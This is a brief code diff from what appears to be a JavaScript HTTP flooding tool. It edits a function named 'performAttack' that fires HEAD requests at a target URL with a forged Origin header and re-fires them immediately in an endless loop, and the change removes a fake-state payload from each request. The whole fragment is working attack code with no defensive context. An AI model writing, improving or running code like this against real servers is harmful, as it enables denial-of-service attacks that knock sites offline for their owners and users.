@@ -154,9 +154,7 @@ const performAttack = (url, agent) => {
         "Origin": url.split("/").slice(0, 3).join("/")
     };
 
-        axios.head(url, {
-        state: fakeState()
-    }, { httpAgent: agent, headers: headersForRequest })
+        axios.head(url, {}, { httpAgent: agent, headers: headersForRequest })
         .then(() => {
             setTimeout(() => performAttack(url, agent), 0);
         })
